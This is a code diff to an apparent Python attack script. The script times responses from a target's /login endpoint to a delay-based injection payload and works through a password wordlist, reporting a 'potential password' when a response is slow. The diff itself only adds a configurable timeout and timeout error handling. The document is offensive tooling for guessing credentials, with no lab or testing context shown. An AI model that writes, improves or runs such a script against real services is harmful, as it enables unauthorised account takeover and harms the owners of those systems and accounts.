@@ -12,7 +12,9 @@ def build_payload(username: str, password: str, delay: int) -> str:
     )
 
 
-def measure_delay(url: str, username: str, password: str, delay: int) -> float:
+def measure_delay(
+    url: str, username: str, password: str, delay: int, timeout: int
+) -> float:
     payload = build_payload(username, password, delay)
     data = urllib.parse.urlencode(
         {
@@ -23,7 +25,7 @@ def measure_delay(url: str, username: str, password: str, delay: int) -> float:
     ).encode("utf-8")
 
     start = time.monotonic()
-    with urllib.request.urlopen(url, data=data, timeout=delay + 10):
+    with urllib.request.urlopen(url, data=data, timeout=timeout):
         pass
     return time.monotonic() - start
 
@@ -51,6 +53,12 @@ def main() -> None:
     parser.add_argument("--wordlist", default="wordlist.txt")
     parser.add_argument("--delay", type=int, default=3)
     parser.add_argument("--threshold", type=float, default=2.5)
+    parser.add_argument(
+        "--timeout",
+        type=int,
+        default=15,
+        help="HTTP timeout in seconds (should be > delay).",
+    )
     args = parser.parse_args()
 
     login_url = f"{args.base_url.rstrip('/')}/login"
@@ -60,7 +68,15 @@ def main() -> None:
             candidate = line.strip()
             if not candidate:
                 continue
-            elapsed = measure_delay(login_url, args.username, candidate, args.delay)
+            try:
+                elapsed = measure_delay(
+                    login_url, args.username, candidate, args.delay, args.timeout
+                )
+            except TimeoutError:
+                print(
+                    "Request timed out. Increase --timeout or check server reachability."
+                )
+                return
             print(f"Tried {candidate!r}: {elapsed:.2f}s")
             if elapsed >= args.threshold:
                 print(f"Potential password found: {candidate}")
